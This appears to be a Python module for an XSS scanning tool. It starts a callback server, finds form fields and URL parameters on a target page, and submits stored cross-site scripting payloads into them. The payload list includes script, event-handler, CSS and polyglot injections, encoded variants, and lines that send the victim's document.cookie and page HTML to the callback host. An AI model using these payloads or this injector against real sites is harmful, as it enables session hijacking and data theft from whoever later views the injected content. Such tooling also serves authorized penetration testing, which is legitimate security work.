"""
Blind XSS Scanner Mode for XSSProbe
Detects blind XSS vulnerabilities using callback mechanisms
"""

import requests
import json
import time
import uuid
import hashlib
import threading
from typing import Dict, List, Optional, Any, Callable
from urllib.parse import urljoin, quote
import socket
import http.server
import socketserver
from datetime import datetime, timedelta
import re


class BlindXSSScanner:
    """
    Scanner for blind XSS vulnerabilities that don't show immediate reflection
    """
    
    def __init__(self, session: requests.Session = None, config: Dict[str, Any] = None):
        self.session = session or requests.Session()
        self.config = config or self._get_default_config()
        self.callback_server = None
        self.callback_url = None
        self.test_identifiers = {}
        self.blind_hits = []
        self.results = []
        self.server_thread = None
        self.running = False
        
    def _get_default_config(self) -> Dict[str, Any]:
        """Default blind XSS configuration"""
        return {
            "callback_port": 8080,
            "callback_host": "0.0.0.0",
            "external_host": None,  # Set this to your external IP/domain
            "wait_time": 30,        # Time to wait for callbacks (seconds)
            "max_wait_time": 300,   # Maximum wait time
            "payload_timeout": 10,   # Timeout for individual payloads
            "use_ngrok": False,     # Whether to use ngrok for public URL
            "ngrok_auth_token": None,
            "callback_endpoints": [
                "/blind-xss-callback",
                "/xss",
                "/callback",
                "/hit"
            ],
            "common_injection_points": [
                "name", "email", "comment", "message", "feedback",
                "title", "description", "content", "text", "value"
            ]
        }
    
    def start_callback_server(self) -> bool:
        """
        Start the callback server to receive blind XSS hits
        
        Returns:
            True if server started successfully
        """
        try:
            if self.running:
                print("[BLIND] Callback server already running")
                return True
            
            # Create callback handler
            handler = self._create_callback_handler()
            
            # Start server
            self.callback_server = socketserver.TCPServer(
                (self.config["callback_host"], self.config["callback_port"]),
                handler
            )
            
            # Start server in background thread
            self.server_thread = threading.Thread(
                target=self.callback_server.serve_forever,
                daemon=True
            )
            self.server_thread.start()
            self.running = True
            
            # Set callback URL
            if self.config["external_host"]:
                self.callback_url = f"http://{self.config['external_host']}:{self.config['callback_port']}"
            else:
                # Use local IP - this won't work for remote testing
                import socket
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                self.callback_url = f"http://{local_ip}:{self.config['callback_port']}"
            
            print(f"[BLIND] ✅ Callback server started at {self.callback_url}")
            return True
            
        except Exception as e:
            print(f"[BLIND] ❌ Failed to start callback server: {e}")
            return False
    
    def stop_callback_server(self):
        """Stop the callback server"""
        if self.callback_server:
            self.callback_server.shutdown()
            self.callback_server.server_close()
            self.running = False
            print("[BLIND] ✅ Callback server stopped")
    
    def _create_callback_handler(self):
        """Create HTTP request handler for callbacks"""
        scanner = self
        
        class BlindXSSCallbackHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                scanner._handle_callback('GET', self.path, self.headers, None)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'OK')
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                scanner._handle_callback('POST', self.path, self.headers, post_data)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'OK')
            
            def log_message(self, format, *args):
                # Suppress default logging
                pass
        
        return BlindXSSCallbackHandler
    
    def _handle_callback(self, method: str, path: str, 
                        headers: Any, data: bytes = None):
        """Handle incoming callback from blind XSS"""
        callback_info = {
            'timestamp': datetime.now().isoformat(),
            'method': method,
            'path': path,
            'headers': dict(headers),
            'data': data.decode('utf-8', errors='ignore') if data else None,
            'user_agent': headers.get('User-Agent', ''),
            'referer': headers.get('Referer', ''),
            'origin': headers.get('Origin', '')
        }
        
        # Extract test identifier from callback
        test_id = self._extract_test_identifier(path, callback_info)
        
        if test_id and test_id in self.test_identifiers:
            test_info = self.test_identifiers[test_id]
            vulnerability = {
                'type': 'blind_xss',
                'severity': 'high',
                'test_id': test_id,
                'url': test_info['url'],
                'parameter': test_info['parameter'],
                'payload': test_info['payload'],
                'method': test_info['method'],
                'callback_info': callback_info,
                'discovered_at': callback_info['timestamp']
            }
            
            self.blind_hits.append(vulnerability)
            print(f"[BLIND] 🚨 Blind XSS hit detected! Test ID: {test_id}")
            print(f"[BLIND] URL: {test_info['url']}")
            print(f"[BLIND] Parameter: {test_info['parameter']}")
        else:
            print(f"[BLIND] 📡 Received callback: {method} {path}")
    
    def _extract_test_identifier(self, path: str, callback_info: Dict) -> Optional[str]:
        """Extract test identifier from callback"""
        # Try to extract from path
        test_id_pattern = r'([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})'
        match = re.search(test_id_pattern, path)
        if match:
            return match.group(1)
        
        # Try to extract from query parameters
        if '?' in path:
            query_part = path.split('?', 1)[1]
            match = re.search(test_id_pattern, query_part)
            if match:
                return match.group(1)
        
        # Try to extract from referer
        referer = callback_info.get('referer', '')
        if referer:
            match = re.search(test_id_pattern, referer)
            if match:
                return match.group(1)
        
        return None
    
    def scan_for_blind_xss(self, target_url: str, 
                          injection_points: List[Dict] = None,
                          wait_time: int = None) -> List[Dict]:
        """
        Scan for blind XSS vulnerabilities
        
        Args:
            target_url: Target URL to scan
            injection_points: Specific injection points to test
            wait_time: Time to wait for callbacks
        
        Returns:
            List of blind XSS vulnerabilities found
        """
        if not self.running:
            if not self.start_callback_server():
                print("[BLIND] Cannot scan without callback server")
                return []
        
        wait_time = wait_time or self.config["wait_time"]
        
        print(f"[BLIND] Starting blind XSS scan of {target_url}")
        print(f"[BLIND] Callback URL: {self.callback_url}")
        
        # Discover injection points if not provided
        if not injection_points:
            injection_points = self._discover_injection_points(target_url)
        
        print(f"[BLIND] Found {len(injection_points)} injection points")
        
        # Generate and test blind XSS payloads
        test_count = 0
        for point in injection_points:
            payloads = self._generate_blind_payloads()
            for payload in payloads:
                test_id = self._test_blind_payload(point, payload)
                if test_id:
                    test_count += 1
        
        print(f"[BLIND] Injected {test_count} blind XSS payloads")
        print(f"[BLIND] Waiting {wait_time} seconds for callbacks...")
        
        # Wait for callbacks
        start_time = time.time()
        while time.time() - start_time < wait_time:
            time.sleep(1)
            # Print periodic updates
            if int(time.time() - start_time) % 10 == 0:
                elapsed = int(time.time() - start_time)
                remaining = wait_time - elapsed
                print(f"[BLIND] Waiting... {remaining}s remaining, {len(self.blind_hits)} hits so far")
        
        # Compile results
        self.results.extend(self.blind_hits)
        print(f"[BLIND] ✅ Scan complete. Found {len(self.blind_hits)} blind XSS vulnerabilities")
        
        return self.blind_hits
    
    def _discover_injection_points(self, target_url: str) -> List[Dict]:
        """Discover potential injection points for blind XSS"""
        injection_points = []
        
        try:
            response = self.session.get(target_url, timeout=self.config["payload_timeout"])
            if response.status_code != 200:
                return injection_points
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Form-based injection points
            for form in soup.find_all('form'):
                action = form.get('action', target_url)
                method = form.get('method', 'GET').upper()
                
                inputs = {}
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    name = input_tag.get('name')
                    input_type = input_tag.get('type', 'text')
                    
                    if name and input_type not in ['submit', 'button', 'reset']:
                        # Prioritize common blind XSS injection points
                        priority = 'high' if any(
                            keyword in name.lower() 
                            for keyword in self.config["common_injection_points"]
                        ) else 'normal'
                        
                        inputs[name] = {
                            'value': input_tag.get('value', ''),
                            'type': input_type,
                            'priority': priority
                        }
                
                if inputs:
                    injection_points.append({
                        'type': 'form',
                        'url': urljoin(target_url, action),
                        'method': method,
                        'parameters': inputs
                    })
            
            # URL parameter injection points
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(target_url)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                url_params = {}
                
                for param_name, param_values in params.items():
                    priority = 'high' if any(
                        keyword in param_name.lower() 
                        for keyword in self.config["common_injection_points"]
                    ) else 'normal'
                    
                    url_params[param_name] = {
                        'value': param_values[0] if param_values else '',
                        'type': 'url_param',
                        'priority': priority
                    }
                
                if url_params:
                    injection_points.append({
                        'type': 'url_params',
                        'url': f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
                        'method': 'GET',
                        'parameters': url_params
                    })
        
        except Exception as e:
            print(f"[BLIND] Error discovering injection points: {e}")
        
        return injection_points
    
    def _generate_blind_payloads(self) -> List[str]:
        """Generate blind XSS payloads with callback URLs"""
        if not self.callback_url:
            return []
        
        payloads = []
        
        # Basic JavaScript payloads
        basic_payloads = [
            # Image-based callbacks
            f"<img src='{self.callback_url}/img?test={{test_id}}' style='display:none'>",
            f"<img src='x' onerror='fetch(\"{self.callback_url}/js?test={{test_id}}\")'>",
            
            # Script-based callbacks
            f"<script>fetch('{self.callback_url}/script?test={{test_id}}')</script>",
            f"<script>new Image().src='{self.callback_url}/beacon?test={{test_id}}'</script>",
            f"<script>document.write('<img src=\"{self.callback_url}/write?test={{test_id}}\">')</script>",
            
            # Event handler callbacks
            f"<div onload='fetch(\"{self.callback_url}/div?test={{test_id}}\")'>",
            f"<body onload='new Image().src=\"{self.callback_url}/body?test={{test_id}}\"'>",
            f"<svg onload='fetch(\"{self.callback_url}/svg?test={{test_id}}\")'>",
            
            # XMLHttpRequest callbacks
            f"<script>var xhr=new XMLHttpRequest();xhr.open('GET','{self.callback_url}/xhr?test={{test_id}}');xhr.send()</script>",
            
            # WebSocket callbacks (if supported)
            f"<script>try{{var ws=new WebSocket('ws://{self.callback_url.replace('http://', '')}/ws?test={{test_id}}')}}catch(e){{}}</script>",
            
            # CSS-based callbacks
            f"<style>@import '{self.callback_url}/css?test={{test_id}}';</style>",
            f"<link rel='stylesheet' href='{self.callback_url}/link?test={{test_id}}'>",
            
            # Meta refresh callbacks
            f"<meta http-equiv='refresh' content='0;url={self.callback_url}/meta?test={{test_id}}'>",
            
            # Form-based callbacks
            f"<form action='{self.callback_url}/form?test={{test_id}}' method='post'><input type='submit' value='x'></form>",
            
            # JavaScript execution with data exfiltration
            f"<script>fetch('{self.callback_url}/data?test={{test_id}}&data='+encodeURIComponent(document.cookie))</script>",
            f"<script>fetch('{self.callback_url}/dom?test={{test_id}}&html='+encodeURIComponent(document.documentElement.outerHTML.substring(0,1000)))</script>",
        ]
        
        # Add encoded versions
        encoded_payloads = []
        for payload in basic_payloads:
            # URL encoding
            encoded_payloads.append(quote(payload))
            # HTML entity encoding
            encoded_payloads.append(''.join(f'&#{ord(c)};' if c in '<>"\'&' else c for c in payload))
        
        payloads.extend(basic_payloads)
        payloads.extend(encoded_payloads)
        
        # Polyglot payloads for various contexts
        polyglots = [
            f"'\"><img src=x onerror=fetch('{self.callback_url}/poly1?test={{test_id}}')>",
            f"javascript:fetch('{self.callback_url}/poly2?test={{test_id}}')",
            f"'/>{{${{fetch('{self.callback_url}/poly3?test={{test_id}}')}}}}",
            f"</script><script>fetch('{self.callback_url}/poly4?test={{test_id}}')</script>",
        ]
        
        payloads.extend(polyglots)
        
        return payloads
    
    def _test_blind_payload(self, injection_point: Dict, payload_template: str) -> Optional[str]:
        """
        Test a blind XSS payload at an injection point
        
        Args:
            injection_point: Injection point information
            payload_template: Payload template with {test_id} placeholder
        
        Returns:
            Test identifier if payload was injected successfully
        """
        try:
            # Generate unique test identifier
            test_id = str(uuid.uuid4())
            payload = payload_template.format(test_id=test_id)
            
            # Test high priority parameters first
            parameters = injection_point['parameters']
            sorted_params = sorted(
                parameters.items(),
                key=lambda x: 0 if x[1].get('priority') == 'high' else 1
            )
            
            for param_name, param_info in sorted_params:
                # Store test information
                self.test_identifiers[test_id] = {
                    'url': injection_point['url'],
                    'parameter': param_name,
                    'payload': payload,
                    'method': injection_point['method'],
                    'injection_type': injection_point['type'],
                    'timestamp': datetime.now().isoformat()
                }
                
                # Inject payload
                success = self._inject_blind_payload(
                    injection_point, param_name, payload
                )
                
                if success:
                    print(f"[BLIND] 💉 Injected payload in {param_name} at {injection_point['url']}")
                    return test_id
                else:
                    # Remove failed test identifier
                    del self.test_identifiers[test_id]
        
        except Exception as e:
            print(f"[BLIND] Error testing blind payload: {e}")
        
        return None
    
    def _inject_blind_payload(self, injection_point: Dict, 
                            param_name: str, payload: str) -> bool:
        """Inject a blind XSS payload"""
        try:
            # Prepare request data
            if injection_point['type'] == 'form':
                form_data = {}
                for name, info in injection_point['parameters'].items():
                    if name == param_name:
                        form_data[name] = payload
                    else:
                        form_data[name] = info.get('value', '')
                
                # Submit form
                if injection_point['method'] == 'POST':
                    response = self.session.post(
                        injection_point['url'],
                        data=form_data,
                        timeout=self.config["payload_timeout"]
                    )
                else:
                    response = self.session.get(
                        injection_point['url'],
                        params=form_data,
                        timeout=self.config["payload_timeout"]
                    )
            
            elif injection_point['type'] == 'url_params':
                url_params = {}
                for name, info in injection_point['parameters'].items():
                    if name == param_name:
                        url_params[name] = payload
                    else:
                        url_params[name] = info.get('value', '')
                
                response = self.session.get(
                    injection_point['url'],
                    params=url_params,
                    timeout=self.config["payload_timeout"]
                )
            
            else:
                return False
            
            # Consider injection successful if we got a response
            return response.status_code < 500
        
        except Exception as e:
            print(f"[BLIND] Error injecting payload: {e}")
            return False
    
    def test_specific_payloads(self, target_urls: List[str], 
                             custom_payloads: List[str],
                             wait_time: int = None) -> List[Dict]:
        """
        Test specific custom payloads for blind XSS
        
        Args:
            target_urls: List of URLs to test
            custom_payloads: Custom blind XSS payloads
            wait_time: Time to wait for callbacks
        
        Returns:
            List of vulnerabilities found
        """
        if not self.running:
            if not self.start_callback_server():
                return []
        
        wait_time = wait_time or self.config["wait_time"]
        
        print(f"[BLIND] Testing {len(custom_payloads)} custom payloads on {len(target_urls)} URLs")
        
        test_count = 0
        for url in target_urls:
            injection_points = self._discover_injection_points(url)
            
            for point in injection_points:
                for payload_template in custom_payloads:
                    test_id = self._test_blind_payload(point, payload_template)
                    if test_id:
                        test_count += 1
        
        print(f"[BLIND] Injected {test_count} custom payloads")
        print(f"[BLIND] Waiting {wait_time} seconds for callbacks...")
        
        # Wait for callbacks
        time.sleep(wait_time)
        
        return self.blind_hits
    
    def generate_blind_report(self) -> Dict:
        """Generate comprehensive blind XSS report"""
        return {
            'scan_type': 'blind_xss',
            'callback_url': self.callback_url,
            'server_running': self.running,
            'total_tests': len(self.test_identifiers),
            'total_hits': len(self.blind_hits),
            'vulnerabilities': self.blind_hits,
            'test_identifiers': self.test_identifiers,
            'scan_timestamp': time.time()
        }
    
    def __del__(self):
        """Cleanup when object is destroyed"""
        if self.running:
            self.stop_callback_server()


# Example usage
if __name__ == "__main__":
    # Initialize blind XSS scanner
    blind_scanner = BlindXSSScanner()
    
    # Configure external host (important for remote testing)
    blind_scanner.config["external_host"] = "your-external-ip-or-domain.com"
    
    try:
        # Start callback server
        if blind_scanner.start_callback_server():
            # Test for blind XSS
            results = blind_scanner.scan_for_blind_xss(
                "https://example.com/feedback",
                wait_time=60
            )
            
            # Generate report
            report = blind_scanner.generate_blind_report()
            print(f"Blind XSS scan completed. Found {len(results)} vulnerabilities.")
            
            # Print detailed results
            for vuln in results:
                print(f"Blind XSS found: {vuln['url']} - {vuln['parameter']}")
        
    finally:
        # Stop callback server
        blind_scanner.stop_callback_server()